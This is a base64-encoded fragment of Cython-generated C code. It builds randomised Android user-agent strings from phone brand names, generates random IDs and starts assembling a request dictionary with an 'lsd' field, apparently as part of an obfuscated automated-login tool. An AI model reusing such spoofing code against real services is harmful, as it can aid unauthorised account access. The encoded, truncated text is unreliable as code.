B5eF90XzQpO1xuICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZGludCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQwMywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIwXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQwMywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzUsIF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQwMywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3gpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRpbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMF0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzQgPSBQeU51bWJlcl9BZGQoX19weXhfdF82LCBfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF81ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IFB5TGlzdF9OZXcoMTIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU0FNU1VORyk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU0FNU1VORyk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzQsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9TQU1TVU5HKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0w1X2Vycm9yKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0hVQVdFSSk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSFVBV0VJKTtcbiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNCwgMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0hVQVdFSSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MNV9lcnJvcik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTEdFX2xnZSk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0xHRV9sZ2UpO1xuICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF80LCAyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0xHRV9sZ2UpICE9ICgwKSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDVfZXJyb3IpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSFRDKTtcbiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9IVEMpO1xuICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF80LCAzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSFRDKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0w1X2Vycm9yKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0FTVVMpO1xuICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0FTVVMpO1xuICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF80LCA0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQVNVUykgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MNV9lcnJvcik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9aVEUpO1xuICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1pURSk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzQsIDUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9aVEUpICE9ICgwKSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDVfZXJyb3IpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfT05FUExVUyk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfT05FUExVUyk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzQsIDYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9PTkVQTFVTKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0w1X2Vycm9yKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1hJQU9NSSk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfWElBT01JKTtcbiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNCwgNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1hJQU9NSSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MNV9lcnJvcik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9PUFBPKTtcbiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9PUFBPKTtcbiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNCwgOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09QUE8pICE9ICgwKSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDVfZXJyb3IpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVklWTyk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVklWTyk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzQsIDksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9WSVZPKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0w1X2Vycm9yKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1NPTlkpO1xuICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1NPTlkpO1xuICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF80LCAxMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1NPTlkpICE9ICgwKSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDVfZXJyb3IpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVBTE1FKTtcbiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRUFMTUUpO1xuICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF80LCAxMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFQUxNRSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MNV9lcnJvcik7XG4gICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZGludCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIxXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNSwgX19weXhfdF83KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzcgPSBQeU51bWJlcl9BZGQoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1NNX1QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNiA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzcsIF9fcHl4X3Zfcm5kKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzcgPSBQeU51bWJlcl9BZGQoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1NNX1QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNiA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzcsIF9fcHl4X3Zfcm5kKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzcgPSBQeU51bWJlcl9BZGQoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3Fjb21fZW5fVVNfNTQ1OTg2KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjJdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNywgX19weXhfdF81KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzUgPSBQeU51bWJlcl9BZGQoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl91c2VyX2FnZW50LCBfX3B5eF90XzUpO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzYgPSBOVUxMO1xuICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZF9pZHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MDUsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcoX19weXhfdl9iYmspOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MDUsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcoX19weXhfdl9JZG8pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MDUsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICAgIF9fcHl4X3RfOSA9IDE7XG4gICAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzcpKSkge1xuICAgICAgICAgICAgX19weXhfdF82ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTtcbiAgICAgICAgICAgIGFzc2VydChfX3B5eF90XzYpO1xuICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzcpO1xuICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF83LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgICAgICB9XG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfNiwgX19weXhfdF80LCBfX3B5eF90Xzh9O1xuICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgzLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDA1LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X0lkLCBfX3B5eF90XzUpO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX3B5eF9wZl8yb3BfM3V1dV9nZW5leHByKE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MDYsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X0dlbmVyYXRvcl9HZXRJbmxpbmVkUmVzdWx0KF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQwNiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19weXhfdF81ID0gUHlVbmljb2RlX0pvaW4oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMiwgX19weXhfdF83KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X2xzZCwgKChQeU9iamVjdCopX19weXhfdF81KSk7XG4gICAgICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQwOSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19w